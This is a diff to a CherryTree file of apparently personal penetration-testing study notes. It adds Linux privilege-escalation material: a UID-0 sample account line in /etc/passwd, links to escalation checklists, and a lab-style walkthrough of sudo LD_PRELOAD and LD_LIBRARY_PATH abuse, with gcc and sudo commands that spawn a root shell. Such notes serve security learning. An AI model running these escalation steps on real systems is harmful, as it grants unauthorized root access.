@@ -235,7 +235,7 @@ C:\Users\</rich_text>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="shells" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655790666.81" ts_lastsave="1655790685.39" unique_id="42">
 		<rich_text>in the simplest possible terms, shells are what we use when  interfacing with a Command Line environment (CLI). In other words, the  common bash or sh programs in Linux  are examples of shells, as are cmd.exe and Powershell on Windows. When  targeting remote systems it is sometimes possible to force an  application running on the server (such as a webserver, for example) to  execute arbitrary code. When this happens, we want to use this initial  access to obtain a shell running on the target.</rich_text>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655401626.74" ts_lastsave="1655817339.51" unique_id="18">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="exploits" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655401626.74" ts_lastsave="1655817811.73" unique_id="18">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="upload_vulns" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655401632.7" ts_lastsave="1655471199.64" unique_id="19">
 			<rich_text>You can use this vulnerability to rewrite a file say an upload form will upload an image in /img/ and also save a file called /img/mountain.jpg, you can upload mountain.jpg to rewrite existing mountain.jpg
@@ -1027,7 +1027,10 @@ While it is often impractical to manually browse the raw file structure and cont
 This might not give you access to the full source code, but comparing the diff will allow you to read small snippets of code. As with any source code, you might also find sensitive data hard-coded within some of the changed lines.
 </rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817339.51" ts_lastsave="1655817357.17" unique_id="50">
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="post_exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817811.73" ts_lastsave="1655817811.73" unique_id="51">
+		<rich_text></rich_text>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="privesc" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655817339.51" ts_lastsave="1655874904.8" unique_id="50">
 			<rich_text>There are two main privilege escalation variants:
 Horizontal privilege escalation: This  is where you expand your reach over the compromised system by taking  over a different user who is on the same privilege level as you. For  instance, a normal user hijacking another normal user (rather than  elevating to super user). This allows you to inherit whatever files and  access that user has. This can be used, for example, to gain access to  another normal privilege user, that happens to have an SUID file  attached to their home directory (more on these later) which can then be  used to get super user access. [Travel sideways on the tree]
 
@@ -1035,7 +1038,90 @@ Horizontal privilege escalation: This  is where you expand your reach over the c
 			<rich_text weight="heavy">Vertical privilege escalation (privilege elevation): </rich_text>
 			<rich_text>This is where you attempt to gain higher privileges or access, with an existing account that you have already compromised.  For local privilege escalation attacks this might mean hijacking an  account with administrator privileges or root privileges. [Travel up on  the tree]
 
-                                    </rich_text>
+    test:x:0:0:root:/root:/bin/bash
+[as divided by colon (:)]
+
+1. Username: It is used when user logs in. It should be between 1 and 32 characters in length.
+2. Password: An x character indicates that encrypted password is stored in /etc/shadow file. Please note that you need to use the passwd command to compute the hash of a password typed at the CLI or to store/update the hash of the password in /etc/shadow file, in this case, the password hash is stored as an &quot;x&quot;.
+
+3. User ID (UID): Each user must be assigned a user ID (UID). UID 0 (zero) is reserved for root and UIDs 1-99 are reserved for other predefined accounts. Further UID 100-999 are reserved by system for administrative and system accounts/groups.
+4. Group ID (GID): The primary group ID (stored in /etc/group file)
+5. User ID Info: The comment field. It allow you to add extra information about the users such as user’s full name, phone number etc. This field use by finger command.
+6. Home directory: The absolute path to the directory the user will be in when they log in. If this directory does not exists then users directory becomes /
+7. Command/shell: The absolute path of a command or shell (/bin/bash). Typically, this is a shell. Please note that it does not have to be a shell.
+
+• </rich_text>
+			<rich_text link="webs https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md">https://github.com/netbiosX/Checklists/blob/master/Linux-Privilege-Escalation.md</rich_text>
+			<rich_text>
+• </rich_text>
+			<rich_text link="webs https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</rich_text>
+			<rich_text>
+• </rich_text>
+			<rich_text link="webs https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html">https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_-_linux.html</rich_text>
+			<rich_text>
+• </rich_text>
+			<rich_text link="webs https://payatu.com/guide-linux-privilege-escalation">https://payatu.com/guide-linux-privilege-escalation</rich_text>
+			<rich_text>
+
+
+tools:
+linenum.sh
+linpeas.sh
+</rich_text>
+			<node custom_icon_id="0" foreground="" is_bold="False" name="environment_variables" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655874904.81" ts_lastsave="1655874928.94" unique_id="52">
+				<rich_text>Sudo can be configured to inherit certain environment variables from the user's environment.
+Check which environment variables are inherited (look for the env_keep options):
+</rich_text>
+				<rich_text family="monospace">sudo -l</rich_text>
+				<rich_text>
+
+</rich_text>
+				<rich_text weight="heavy">Matching Defaults entries for user on this host:
+    env_reset, env_keep+=LD_PRELOAD, env_keep+=LD_LIBRARY_PATH
+</rich_text>
+				<rich_text>
+User user may run the following commands on this host:
+    (root) NOPASSWD: /usr/sbin/iftop
+    (root) NOPASSWD: /usr/bin/find
+    (root) NOPASSWD: /usr/bin/nano
+    (root) NOPASSWD: /usr/bin/vim
+    (root) NOPASSWD: /usr/bin/man
+    (root) NOPASSWD: /usr/bin/awk
+    (root) NOPASSWD: /usr/bin/less
+    (root) NOPASSWD: /usr/bin/ftp
+    (root) NOPASSWD: /usr/bin/nmap
+    (root) NOPASSWD: /usr/sbin/apache2
+    (root) NOPASSWD: /bin/more
+
+LD_PRELOAD and LD_LIBRARY_PATH are both inherited from the user's environment. LD_PRELOAD  loads a shared object before any others when a program is run.  LD_LIBRARY_PATH provides a list of directories where shared libraries  are searched for first.
+Create a shared object using the code located at /home/user/tools/sudo/preload.c:
+</rich_text>
+				<rich_text family="monospace">gcc -fPIC -shared -nostartfiles -o /tmp/preload.so /home/user/tools/sudo/preload.c</rich_text>
+				<rich_text>
+Run one of the programs you are allowed to run via sudo (listed when running </rich_text>
+				<rich_text weight="heavy">sudo -l</rich_text>
+				<rich_text>), while setting the LD_PRELOAD environment variable to the full path of the new shared object:
+</rich_text>
+				<rich_text family="monospace">sudo LD_PRELOAD=/tmp/preload.so program-name-here</rich_text>
+				<rich_text>
+A  root shell should spawn. Exit out of the shell before continuing.  Depending on the program you chose, you may need to exit out of this as  well.
+Run ldd against the apache2 program file to see which shared libraries are used by the program:
+</rich_text>
+				<rich_text family="monospace">ldd /usr/sbin/apache2</rich_text>
+				<rich_text>
+Create  a shared object with the same name as one of the listed libraries  (libcrypt.so.1) using the code located at  /home/user/tools/sudo/library_path.c:
+</rich_text>
+				<rich_text family="monospace">gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c</rich_text>
+				<rich_text>
+Run  apache2 using sudo, while settings the LD_LIBRARY_PATH environment  variable to /tmp (where we output the compiled shared object):
+</rich_text>
+				<rich_text family="monospace">sudo LD_LIBRARY_PATH=/tmp apache2</rich_text>
+				<rich_text>
+A root shell should spawn. Exit out of the shell. Try renaming /tmp/libcrypt.so.1  to the name of another library used by apache2 and re-run apache2 using  sudo again. Did it work? If not, try to figure out why not, and how  the library_path.c code could be changed to make it work.
+
+
+</rich_text>
+			</node>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="cryptography" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655479227.52" ts_lastsave="1655483576.23" unique_id="21">
